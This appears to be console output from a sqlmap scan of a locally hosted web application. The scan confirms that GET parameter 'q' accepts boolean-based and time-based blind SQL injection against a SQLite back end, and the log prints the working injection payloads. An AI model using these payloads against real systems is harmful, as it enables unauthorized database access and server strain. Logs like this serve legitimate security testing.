        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:48:53 /2025-09-15/

[16:48:53] [INFO] testing connection to the target URL
[16:48:53] [INFO] testing if the target URL content is stable
[16:48:53] [INFO] target URL content is stable
[16:48:53] [INFO] testing if GET parameter 'q' is dynamic
[16:48:53] [INFO] GET parameter 'q' appears to be dynamic
[16:48:53] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
[16:48:53] [INFO] testing for SQL injection on GET parameter 'q'
[16:48:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:48:54] [INFO] GET parameter 'q' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[16:48:54] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
[16:48:54] [INFO] testing 'Generic inline queries'
[16:48:54] [INFO] testing 'SQLite inline queries'
[16:48:54] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[16:48:54] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[16:48:54] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[16:49:00] [INFO] GET parameter 'q' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
[16:49:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:49:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:49:01] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[16:49:02] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[16:49:02] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[16:49:02] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[16:49:03] [INFO] checking if the injection point on GET parameter 'q' is a false positive
[16:49:03] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 169 HTTP(s) requests:
---
Parameter: q (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=test%' AND 1556=1556 AND 'siIx%'='siIx

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: q=test%' AND 1098=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'plqG%'='plqG
---
[16:49:03] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[16:49:03] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 139 times
[16:49:03] [INFO] fetched data logged to text files under '/home/lucifer/.local/share/sqlmap/output/localhost'

[*] ending @ 16:49:03 /2025-09-15/

